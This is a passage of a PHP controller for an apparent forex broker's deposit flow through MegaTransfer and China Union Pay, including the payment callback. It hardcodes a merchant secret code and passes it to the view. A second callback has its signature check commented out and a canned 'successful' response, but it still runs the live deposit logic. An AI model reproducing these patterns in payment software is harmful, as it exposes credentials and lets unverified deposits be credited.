                        'conv_amount' => $conv_amount,
                    ];
                $deposit_id = $this->deposit_model->insertPayment($depositArray);

                $selectedBonus = '';
                if (isset($_GET['bonus']) and !empty($_GET['bonus'])) {
                    $selectedBonus = '?bonus='.$_GET['bonus'];
                }

                //merchant payment gateway parameters
                $paymentArray = [
                        'items' => $items,
                        'quantity' => $quantity,
                        'amount' => $amount,
                        'currency' => $currency,
                        'client_name' => $getUserProfileByUserId['full_name'],
                        'client_country' => $getUserProfileByUserId['country'],
                        'client_city' => $getUserProfileByUserId['city'],
                        'client_email' => $getUserProfileByUserId['email'],
                        'reg_date' => $newData,
                        'url' => 'https://www.megatransfer.com/payments/',
                        'merchant_id' => $merchant_id,
                        'secret_code' => $secret_code,
                        'separator' => $separator,
                        'order_id' => $order_number,
                        'total_amount' => $total_amount,
                        'signature' => $signature,
                        'payment_method' => 'mt',
                        'gateway_id' => 1, //  for demo=0; and live=1;
                        'success_url' => site_url().'deposit/megatransfer-success',
                        'fail_url' => site_url().'deposit/megatransfer-fail',
                        'callback_url' => site_url().'deposit/megatransfer_callback'.$selectedBonus,
                    ];

                FXPP::failedPaymentNotify('megatransfer'); //FXPP-9628

                $this->load->view('deposits/megatransfer_payment', $paymentArray);
//                } else {
//                    $data['account_currency'] = $this->general_model->getAccountCurrencyBase();
//                    if ($this->session->userdata('login_type') == 1) {
//                        $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
//                    } else {
//                        $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
//                    }
//                    $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
//
//                    $data['user_status'] = $user_status;
//
//                    $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
//                    $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
//
//                    if ($this->session->userdata('login_type') == 1) {
//                        $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
//                    } else {
//                        $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
//                    }
//
//
//                    $data['account'] = $account;
//                    $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
//                    $data['account']['currency_new'] = $data['account']['currency'];
//                    if ($data['account']['currency_new'] == 'RUB') {
//                        $data['account']['currency_new'] = 'RUR';
//                    }
//                    $display = $this->session->flashdata('d_mt_display');
//                    if (isset($display)) {
//                        if (!$display) {
////                        $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
//                            $email_details = array(
//                                'account_number' => $account['account_number'],
//                                'type'           => 'MegaTransfer',
//                                'reason'         => 'CANCELLED',
//                            );
//                            $this->sendEmailFailedDeposit($email_details);
//                        }
//                    }
//
//                    $js = $this->template->Js();
//                    $this->template->title("ForexMart | Deposit - MegaTransfer")
//                        ->set_layout('internal/main')
//                        ->prepend_metadata("
//                        <script src='" . $js . "jquery.js'></script>
//                        <script src='" . $js . "custom-deposit.js'></script>
//                            ")
//                        ->build('deposits/megatransfer', $data);
//                }
            } else {
                $data['account_currency'] = $this->general_model->getAccountCurrencyBase();
                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));

                //  $data['user_status'] = $user_status;

                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                if ($this->session->userdata('login_type') == 1) {
                    $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
                } else {
                    $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                }

                $eu_payment_result = $this->euPaymentStatus($this->session->userdata('user_id'), 'megatransfer'); //FXPP-9628
                $data['eu_payment_status'] = $eu_payment_result['error'];
                $data['eu_error_message'] = $eu_payment_result['error_msg'];

                $data['account'] = $account;
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
                $data['account']['currency_new'] = $data['account']['currency'];
                if ($data['account']['currency_new'] == 'RUB') {
                    $data['account']['currency_new'] = 'RUR';
                }
                $display = $this->session->flashdata('d_mt_display');
                if (isset($display)) {
                    if (!$display) {
//                        $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                        $email_details = [
                            'account_number' => $account['account_number'],
                            'type' => 'MegaTransfer',
                            'reason' => 'CANCELLED',
                        ];
                        $this->sendEmailFailedDeposit($email_details);
                    }
                }

                $js = $this->template->Js();
                $this->template->title('ForexMart | Deposit - MegaTransfer')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                        <script src='".$js."jquery.js'></script>
                        <script src='".$js."custom-deposit.js'></script>
                            ")
                    ->build('deposits/megatransfer', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function chinaUnionPay()
    {
        if (!IPLoc::Office()) {
            redirect(FXPP::loc_url('deposit'));
        }

        if ($this->session->userdata('logged')) {
            // redirect(FXPP::loc_url('deposit')); //FXPP-9655
            // $getUserProfileByUserId = $this->user_model->getUserProfileByUserId($this->session->userdata('user_id'));
            // $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));

            if ($this->session->userdata('login_type') == 1) {
                $getUserProfileByUserId = $this->user_model->getUserProfileByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
            } else {
                $getUserProfileByUserId = $this->user_model->getUserProfileByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }

            $currency_conv = $account['mt_currency_base'];
            $data['amount'] = $this->input->post_get('amount1', true);
            //  if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Deposit amount', "trim|required|deposit_min_amount[$currency_conv]");
            //  }

            // $this->form_validation->set_rules('cup_account_name', lang('with_04'), 'trim|required');
            // $this->form_validation->set_rules('cup_bank_name', lang('with_03'), 'trim|required');
            // $this->form_validation->set_rules('cup_bank_number', lang('with_01'), 'trim|required');
            // $this->form_validation->set_rules('cup_branch', lang('with_02'), 'trim|required');
            // $this->form_validation->set_rules('cup_province', lang('with_06'), 'trim|required');
            // $this->form_validation->set_rules('cup_city', lang('with_05'), 'trim|required');

            $data['hasError'] = false;
            if ($this->form_validation->run() === false) {
                $data['hasError'] = true;
            }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));
//            $data['fail_lang'] = FXPP::html_url();
            $data['fail_lang2'] = $this->input->post('base_url', true);
            if ($this->form_validation->run() && !$data['error_msg']) {
                // if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960

                $test_accounts = [
                        '135835', //30 percent
                        '231290', //100 percent
                        '231291', //50 percent
                        '132478', // partner
                    ];
                $quantity = 1;
                $amount = $this->input->post('amount', true);
                $secret_code = 'a2f3d777a9a77882042349a492ef52636991850e4414c998c396cc882a52a5c4';
                $separator = 'hGsyTf23';
                $merchant_id = 158964761;
                $total_amount = (int) $quantity * (float) $amount;
                $total_amount = sprintf('%1.2f', $total_amount);
                $success_url = $this->input->post('base_url', true).'deposit/chinaUnionPay-success';
                $fail_url = $this->input->post('base_url', true).'deposit/chinaUnionPay-fail';

                $items = 'ForexMart Deposit [CUP - '.$account['account_number'].']';
                $currency = $account['mt_currency_base'];
                $signature = hash('sha256', $secret_code.$separator.$merchant_id.$separator.$items.$separator.$quantity.$separator.$amount.$separator.$total_amount.$separator.$currency.$separator.$secret_code);

                $createDate = new DateTime($getUserProfileByUserId['created']);
                $newData = $createDate->format('Y-m-d');

                $date = new DateTime();
                $order_number = $date->getTimestamp();

//                insert database record
                $conv_amount = $this->get_convert_amount($currency, $amount);
                $depositArray = [
                        'transaction_id' => 0,
                        'reference_id' => $order_number,
                        'status' => 0,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $this->session->userdata('user_id'),
                        'date_request' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'CHINAUNIONPAY',
                        'conv_amount' => $conv_amount,
                    ];
                $this->deposit_model->insertPayment($depositArray);

                //  if(IPLoc::Office()) {

                $cup_deposit_details = [
                        'bank_account_number' => $this->input->post('cup_bank_number', true),
                        'bank_account_name' => $this->input->post('cup_account_name', true),
                        'bank_name' => $this->input->post('cup_bank_name', true),
                        'branch' => $this->input->post('cup_branch', true),
                        'province' => $this->input->post('cup_province', true),
                        'city' => $this->input->post('cup_city', true),
                        'user_id' => $this->session->userdata('user_id'),
                        'date_request' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                    ];

                $this->deposit_model->insertPayment_v2('chinaunionpay_deposit', $cup_deposit_details);
                //  }

                $selectedBonus = '';
                if (isset($_GET['bonus']) and !empty($_GET['bonus'])) {
                    $selectedBonus = '?bonus='.$_GET['bonus'];
                }

                $isLive = 1;
                if (in_array($depositArray['user_id'], $test_accounts)) {
                    $isLive = 0;
                }

                //merchant payment gateway parameters
                $paymentArray = [
                        'items' => $items,
                        'quantity' => $quantity,
                        'amount' => $amount,
                        'currency' => $currency,
                        'client_name' => $getUserProfileByUserId['full_name'],
                        'client_country' => $getUserProfileByUserId['country'],
                        'client_city' => $getUserProfileByUserId['city'],
                        'client_email' => $getUserProfileByUserId['email'],
                        'reg_date' => $newData,
                        'url' => 'https://www.megatransfer.com/payments/',
                        'merchant_id' => $merchant_id,
                        'secret_code' => $secret_code,
                        'separator' => $separator,
                        'order_id' => $order_number,
                        'total_amount' => $total_amount,
                        'signature' => $signature,
                        'payment_method' => 'CH',
                        'gateway_id' => $isLive, //  for demo=0; and live=1;
                        'success_url' => $success_url,
                        'fail_url' => $fail_url,
                        'callback_url' => site_url().'deposit/megatransfer_callback'.$selectedBonus,
                    ];

                $this->load->view('deposits/megatransfer_payment', $paymentArray);
//                } else {
//                    $data['account_currency'] = $this->general_model->getAccountCurrencyBase();
//                    if ($this->session->userdata('login_type') == 1) {
//                        $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
//                    } else {
//                        $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
//                    }
//                    $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
//
//                    $data['user_status'] = $user_status;
//
//                    $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
//                    $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
//
//                    if ($this->session->userdata('login_type') == 1) {
//                        $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
//                    } else {
//                        $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
//                    }
//                    $data['account'] = $account;
//                    $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
//                    $data['account']['currency_new'] = $data['account']['currency'];
//                    if ($data['account']['currency_new'] == 'RUB') {
//                        $data['account']['currency_new'] = 'RUR';
//                    }
//                    $display = $this->session->flashdata('d_mt_display');
//                    if (isset($display)) {
//                        if (!$display) {
////                        $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
//                            $email_details = array(
//                                'account_number' => $account['account_number'],
//                                'type'           => 'MegaTransfer',
//                                'reason'         => 'CANCELLED',
//                            );
//                            $this->sendEmailFailedDeposit($email_details);
//                        }
//                    }
//
//                    $js = $this->template->Js();
//                    $this->template->title("ForexMart | Deposit - China Union Pay")
//                        ->set_layout('internal/main')
//                        ->prepend_metadata("
//                        <script src='" . $js . "jquery.js'></script>
//                        <script src='" . $js . "custom-deposit.js'></script>
//                            ")
//                        ->build('deposits/chinaUnionPay', $data);
//                }
            } else {
                $data['account_currency'] = $this->general_model->getAccountCurrencyBase();
                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));

                // $data['user_status'] = $user_status;

                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                if ($this->session->userdata('login_type') == 1) {
                    $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
                } else {
                    $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                }
                $data['account'] = $account;
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
                $data['account']['currency_new'] = $data['account']['currency'];
                if ($data['account']['currency_new'] == 'RUB') {
                    $data['account']['currency_new'] = 'RUR';
                }
                $display = $this->session->flashdata('d_mt_display');
                if (isset($display)) {
                    if (!$display) {
//                        $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                        $email_details = [
                            'account_number' => $account['account_number'],
                            'type' => 'MegaTransfer',
                            'reason' => 'CANCELLED',
                        ];
                        $this->sendEmailFailedDeposit($email_details);
                    }
                }

                $js = $this->template->Js();
                $this->template->title('ForexMart | Deposit - China Union Pay')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                        <script src='".$js."jquery.js'></script>
                        <script src='".$js."custom-deposit.js'></script>
                            ")
                    ->build('deposits/chinaUnionPay', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function megatransfer_creditcard_fail()
    {
//      0 - form, 1 - success, 2 - failed
        $this->session->set_flashdata('d_mt_display', 0);
        redirect('deposit/megatransfer-credit-card');
    }

    public function megatransfer_fail()
    {
        // 0 - form, 1 - success, 2 - failed
        $this->session->set_flashdata('d_mt_display', 0);
        redirect(FXPP::loc_url('deposit/megatransfer'));
    }

    public function chinaUnionPay_fail()
    {
        // 0 - form, 1 - success, 2 - failed
        $this->session->set_flashdata('d_mt_display', 0);
        redirect(FXPP::loc_url('deposit/chinaUnionPay'));
    }

    public function megatransfer_callback()
    {
        parse_str(file_get_contents('php://input'), $_POST);
        $response = $_POST['response'];
        $test = $_GET['bonus'];
        $insDataArray = [
            'Response' => $response,
            'Test' => $test,
        ];

        $this->deposit_model->testresponsemegatransfer($insDataArray);

        $responseArray = json_decode($response, true);

        $amount = $responseArray['amount'];
        $order_id = $responseArray['order_id'];
        $status = $responseArray['status'];
        $token = $responseArray['token'];
        $transaction_id = $responseArray['transaction_id'];
        $secret_code = 'a2f3d777a9a77882042349a492ef52636991850e4414c998c396cc882a52a5c4';

        $signTransaction = hash('md5', $secret_code.$order_id.$transaction_id.$secret_code);

        $getTransactionDepositData = $this->deposit_model->getTransactionDepositData($order_id);
        $user_id = $getTransactionDepositData['user_id'];

        if ($status == 'successful') {
            if ($token == $signTransaction) {
                $config = [
                    'server' => 'live_new',
                ];
                $WebService = new WebService($config);

                $currency = $getTransactionDepositData['currency'];
                $logtype = 0;
                $getAccountByUserId = $this->account_model->getAccountByUserId($user_id);
                if (!$getAccountByUserId) {
                    $getAccountByUserId = $this->account_model->getAccountByPartnerId2($user_id);
                    $logtype = 1;
                }

                $account_number = $getAccountByUserId['account_number'];

                $paymentMethod = strtoupper($responseArray['payment_method']);

                if ($paymentMethod == 'CC') {
                    $maxNumofDeposit = 2; //for regular 100% bonus
                    $commentTransactionType = 'MEGATRANSFER_CC';
                    $amountToDeposit = $responseArray['amount_credited'];
                    $payment_status = $this->paymentType_status['Deposit via Debit/Credit (MegaTransfer)']; //FXPP-7618
                } elseif ($paymentMethod == 'CH') {
                    $maxNumofDeposit = 1; //for regular 100% bonus
                    $commentTransactionType = 'CHINAUNIONPAY';
                    $amountToDeposit = $responseArray['amount_credited'];
                    $payment_status = $this->paymentType_status['Deposit via China Union Pay']; //FXPP-8580
                } else {
                    $maxNumofDeposit = 1; //for regular 100% bonus
                    $commentTransactionType = 'MEGATRANSFER';

                    $amountToDeposit = $responseArray['amount'];
                    $payment_status = $this->paymentType_status['Deposit via MegaTransfer']; //FXPP-7618
                }
                $currencyStatus = $this->currency_status[$currency];
                $isMicro = $this->account_model->isMicro($user_id);
                if ($isMicro) {
                    $amount *= 100;
                    $amountToDeposit *= 100;
                    $currencyStatus = $this->currency_status['Cents'];
                }

                $paymentDate = date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime()));

                // query get unique transaction id where transaction type is equal to MEGATRANSFER and transaction id = $transaction id
                $getDepositByTransactionId = $this->deposit_model->getDepositByTransactionId($transaction_id, 'MEGATRANSFER');
                $getDepositByTransactionId_v2 = $this->deposit_model->getDepositByTransactionId($transaction_id, 'CHINAUNIONPAY');
                if ($getDepositByTransactionId || $getDepositByTransactionId_v2) {
                    return;
                }

                $insertDepositFailed = [
                    'transaction_id	' => $transaction_id,
                    'status	' => 0,
                    'amount	' => $amount,
                    'currency' => $currency,
                    'user_id' => $user_id,
                    'payment_date' => $paymentDate,
                    'transaction_type' => $commentTransactionType,
                    'payment_status	' => $payment_status,
                    'currency_status' => $currencyStatus,
                    'fee' => '',
                    'isFailed' => 0,
                    'type' => 'deposit-'.$isMicro.'-'.$_GET['bonus'],
                ];

//                if (IPLoc::APIUpgradeDevIP()) {
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $amountToDeposit, $this->comment_type['deposit'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
//                } else {
//                    $WebService->update_live_deposit_balance($account_number, $amountToDeposit, $this->comment_type['deposit'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
//                    $requestResult = $WebService->request_status;
//                    $ticket = $WebService->get_result('Ticket');
//                }

                if ($requestResult === 'RET_OK') {
                    $mt_ticket = $ticket;

                    // Back Agent of Client
                  //  FXPP::BackAgentOfAccount($account_number);
                    $conv_amount = $this->get_convert_amount($currency, $amountToDeposit);

                    $transactionData = [
                        'amount' => $amountToDeposit,
                        'transaction_id' => $transaction_id,
                        'payment_date' => $paymentDate,
                        'status' => 2,
                        'mt_ticket' => $mt_ticket,
                        'conv_amount' => $conv_amount,
                        'payment_status' => $payment_status, //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];
                    $this->deposit_model->updateDepositTransactionData($order_id, $transactionData);

                    if ($paymentMethod == 'CC') {
                        $computeMegaTransferFee = $this->computeMegaTransferFee($amount, $currency, $isMicro);
                        $conv_amount_fee_usd = $this->get_convert_amount($currency, $computeMegaTransferFee);
//                        $WebService3 = new WebService($config);

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $computeMegaTransferFee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService3->update_live_deposit_balance($account_number, $computeMegaTransferFee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
//                            $requestResult = $WebService3->request_status;
//                            $ticket = $WebService3->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $mt_ticket_fee = $ticket;

                            $payment_fee = [
                                'transaction_id' => $transaction_id,
                                'reference_id' => $order_id,
                                'status' => 2,
                                'amount' => $computeMegaTransferFee,
                                'currency' => $currency,
                                'user_id' => $user_id,
                                'payment_date' => $paymentDate,
                                'transaction_type' => 'MEGATRANSFER',
                                'conv_amount' => $conv_amount_fee_usd,
                                'mt_ticket' => $mt_ticket_fee,
                                'payment_status' => $payment_status, //FXPP-7618
                                'currency_status' => $currencyStatus, //FXPP-7618
                            ];
                            $this->deposit_model->insertPayment($payment_fee);
                        }

                        if ($requestResult != 'RET_OK') {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    if ($paymentMethod == 'CH') {
                        $CupFee = 0.02;
//                        if($isMicro){
//                            $CupFee =  100 * 0.02;
//                        }

                        $computeMegaTransferFee = $amount * $CupFee; //https://www.megatransfer.com/megatransfer-fees
                        $conv_amount_fee_usd = $this->get_convert_amount($currency, $computeMegaTransferFee);
//                        $WebService3 = new WebService($config);

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $computeMegaTransferFee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService3->update_live_deposit_balance($account_number, $computeMegaTransferFee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
//                            $requestResult = $WebService3->request_status;
//                            $ticket = $WebService3->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $mt_ticket_fee = $ticket;

                            $payment_fee = [
                                'transaction_id' => $transaction_id,
                                'reference_id' => $order_id,
                                'status' => 2,
                                'amount' => $computeMegaTransferFee,
                                'currency' => $currency,
                                'user_id' => $user_id,
                                'payment_date' => $paymentDate,
                                'transaction_type' => 'CHINAUNIONPAY',
                                'conv_amount' => $conv_amount_fee_usd,
                                'mt_ticket' => $mt_ticket_fee,
                                'payment_status' => $payment_status, //FXPP-8580
                                'currency_status' => $currencyStatus, //FXPP-8580
                            ];
                            $this->deposit_model->insertPayment($payment_fee);
                        }

                        if ($requestResult != 'RET_OK') {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $isMicro = $this->account_model->isMicro($user_id);
                    if ($commentTransactionType == 'MEGATRANSFER_CC') {
                        /**  Use original amount to Cent accounts for  auto-reports**/
                        $processed_amount = floatval($conv_amount) + floatval($conv_amount_fee_usd);
                        if ($isMicro) {
                            $processed_amount = floatval($processed_amount / 100);
                        }
                    }
                    if ($commentTransactionType == 'CHINAUNIONPAY') {
                        //$processed_amount = $conv_amount;
                        $processed_amount = floatval($conv_amount) + floatval($conv_amount_fee_usd);
                        if ($isMicro) {
                            $processed_amount = floatval($processed_amount / 100);
                        }
                    }

                    if ($commentTransactionType == 'MEGATRANSFER') {
                        $processed_amount = $conv_amount;
                        if ($isMicro) {
                            $processed_amount = floatval($processed_amount / 100);
                        }
                    }

                    if ($paymentMethod == 'CC') {
                        $type = 'MegaTransfer Card Payments';
                    } elseif ($paymentMethod == 'CH') {
                        $type = 'MegaTransfer China Union Pay Payments';
                    } else {
                        $type = 'MegaTransfer Payments';
                    }

                    $fundsDepositDetails = [
                        'processed_amount' => $processed_amount,
                        'user_id' => $user_id,
                        'account_number' => $account_number,
                        'transaction_comment' => $this->comment_type['deposit'].$this->comment_transaction_type[$commentTransactionType].$transaction_id,
                        'transaction_type' => 'MEGATRANSFER', //'Neteller'
                    ];

                    $insertDepositFailed['comment'] = 'Deposit Report Log';
                    $insertDepositFailed['details'] = json_encode($fundsDepositDetails);
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);

                    $this->sendEmailAfterSuccessDeposit($type, $processed_amount, $account_number, $user_id, $this->comment_type['deposit'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);

                    $RequestLogintype = $this->account_model->getAccountLoginType($user_id);

                    if (isset($_GET['bonus']) && !empty($_GET['bonus'])) {
//                        if ($_GET['bonus'] === 'hpb') {
//                            // 100% bonus
//                            FXPP::Deposit100PercentBonus($user_id, $account_number, $amount, $commentTransactionType, 'hplb', $transaction_id);
//                        } elseif ($_GET['bonus'] === 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($user_id, $account_number, $amount, $commentTransactionType, 'rhpb', $transaction_id, $maxNumofDeposit);
//                        } else {
//                            FXPP::DepositBonus($user_id, $account_number, $amount, $commentTransactionType, $_GET['bonus'], $transaction_id);
//                        }
                        self::applyDepositBonus($user_id, $account_number, $amount, $commentTransactionType, $_GET['bonus'], $transaction_id, false);
                    }

                    // Bonus Profit and NDB cancellation **/
                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($user_id, $account_number, $amount, $transaction_id);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $amount,
                        'UserId' => $user_id,
                        'TransactionId' => $transaction_id,
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $user_id,
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    $WebService4 = new WebService($config);
                    $WebService4->request_live_account_balance($account_number);
                    if ($WebService4->request_status === 'RET_OK') {
                        $balance = $WebService4->get_result('Balance');
                        if ($logtype == 1) {
                            $updatedAccountBalance = $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                        } else {
                            $updatedAccountBalance = $this->account_model->updateAccountBalance($account_number, $balance);
                        }

                        $insDataArray = [
                            'Response' => json_encode($updatedAccountBalance),
                            'Test' => $this->session->userdata('login_type').'-'.$logtype.'-'.$account_number.'-'.$balance,
                        ];
                        $this->deposit_model->testresponsemegatransfer($insDataArray);
                    }

                    if ($WebService4->request_status != 'RET_OK') {
                        $insertDepositFailed['comment'] = $WebService4->request_status;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                }

                if ($requestResult != 'RET_OK') {
                    $insertDepositFailed['comment'] = $requestResult;
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                }
            }
        } else {
            if ($this->session->userdata('login_type') == 1) {
                $account_detail = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
            } else {
                $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }
            $email_details = [
                'account_number' => $account_detail['account_number'],
                'type' => 'MegaTransfer',
                'reason' => $responseArray['message'],
            ];
            $this->sendEmailFailedDeposit($email_details);

            if (strtoupper($responseArray['payment_method']) == 'CC') {
                $mt_payment_type = 'megatransfer_cc';
            } else {
                $mt_payment_type = 'megatransfer';
            }

            FXPP::failedPaymentNotify($mt_payment_type, 1, $user_id, $responseArray['message']); //FXPP-9628

            $transactionData = [
                'transaction_id' => 0,
                'status' => 1,
                'note' => $responseArray['message'],
            ];
            $this->deposit_model->updateDepositTransactionData($order_id, $transactionData);
        }
    }

    public function megatransfer_callback_v2()
    {
        $responseArray = '{"items":"ForexMart Deposit","quantity":"1","amount":"10","currency":"USD","total_amount":"10.00","merchant_id":"158964761","order_id":"1499169836","transaction_id":10405454041111,"token":"99874b37b852777632db3611e435adf5","status":"successful","payment_method":"CC","amount_credited":"9.11"}';

        $responseArray = json_decode($responseArray, true);

        $amount = $responseArray['amount'];
        $order_id = $responseArray['order_id'];
        $status = $responseArray['status'];
        $token = $responseArray['token'];
        $transaction_id = $responseArray['transaction_id'];
        $secret_code = 'a2f3d777a9a77882042349a492ef52636991850e4414c998c396cc882a52a5c4';

        $signTransaction = hash('md5', $secret_code.$order_id.$transaction_id.$secret_code);

        $getTransactionDepositData = $this->deposit_model->getTransactionDepositData($order_id);
        $user_id = $getTransactionDepositData['user_id'];

        if ($status == 'successful') {
            //   if ($token == $signTransaction) {

            $config = [
                'server' => 'live_new',
            ];
            $WebService = new WebService($config);

            $currency = $getTransactionDepositData['currency'];
            $logtype = 0;
            $getAccountByUserId = $this->account_model->getAccountByUserId($user_id);
            if (!$getAccountByUserId) {
                $getAccountByUserId = $this->account_model->getAccountByPartnerId2($user_id);
                $logtype = 1;
            }

            $account_number = $getAccountByUserId['account_number'];

            $paymentMethod = strtoupper($responseArray['payment_method']);

            if ($paymentMethod == 'CC') {
                $maxNumofDeposit = 2; //for regular 100% bonus
                $commentTransactionType = 'MEGATRANSFER_CC';
                $amountToDeposit = $responseArray['amount_credited'];
                $payment_status = $this->paymentType_status['Deposit via Debit/Credit (MegaTransfer)']; //FXPP-7618
            } elseif ($paymentMethod == 'CH') {
                $maxNumofDeposit = 1; //for regular 100% bonus
                $commentTransactionType = 'CHINAUNIONPAY';
                $amountToDeposit = $responseArray['amount_credited'];
                $payment_status = $this->paymentType_status['Deposit via China Union Pay']; //FXPP-8580
            } else {
                $maxNumofDeposit = 1; //for regular 100% bonus
                $commentTransactionType = 'MEGATRANSFER';

                $amountToDeposit = $responseArray['amount'];
                $payment_status = $this->paymentType_status['Deposit via MegaTransfer']; //FXPP-7618
            }
            $currencyStatus = $this->currency_status[$currency];
            $isMicro = $this->account_model->isMicro($user_id);
            if ($isMicro) {
                $amount *= 100;
                $amountToDeposit *= 100;
                $currencyStatus = $this->currency_status['Cents'];
            }

            $paymentDate = date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime()));

            // query get unique transaction id where transaction type is equal to MEGATRANSFER and transaction id = $transaction id
            $getDepositByTransactionId = $this->deposit_model->getDepositByTransactionId($transaction_id, 'MEGATRANSFER');
            $getDepositByTransactionId_v2 = $this->deposit_model->getDepositByTransactionId($transaction_id, 'CHINAUNIONPAY');
            if ($getDepositByTransactionId || $getDepositByTransactionId_v2) {
                return;
            }

            $insertDepositFailed = [
                'transaction_id	' => $transaction_id,
                'status	' => 0,
                'amount	' => $amount,
                'currency' => $currency,
                'user_id' => $user_id,
